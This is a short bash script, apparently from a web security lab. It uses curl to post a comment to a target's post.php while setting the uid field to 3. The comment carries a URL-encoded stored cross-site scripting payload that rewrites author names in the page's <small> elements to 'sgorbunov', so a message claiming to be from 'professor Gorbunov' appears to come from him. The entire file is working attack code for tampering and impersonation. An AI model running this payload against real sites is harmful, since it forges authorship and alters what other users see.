#!/bin/bash

POST_URL="${1}/post.php"

echo "Attempting to post a comment as uid 3..."
echo "form=comment&parent=1&comment=%3Cscript%3Edocument.addEventListener%28%22DOMContentLoaded%22%2Cfunction%28%29%7Bfor%28var+a%3Ddocument.getElementsByTagName%28%22small%22%29%2Cb%3D0%3Bb%3Ca.length%3B%2B%2Bb%29a%5Bb%5D.innerHTML%3Da%5Bb%5D.innerHTML.replace%28%22cmcknigh%22%2C%22%23bunov%22%29.replace%28%22%23%22%2C%22sgor%22%29%7D%29%3B%3C%2Fscript%3EI+am+professor+Gorbunov+and+I+approve+this+message.&uid=3&submit=Post" | curl -L -d @- -s ${POST_URL} > /dev/null

echo ""
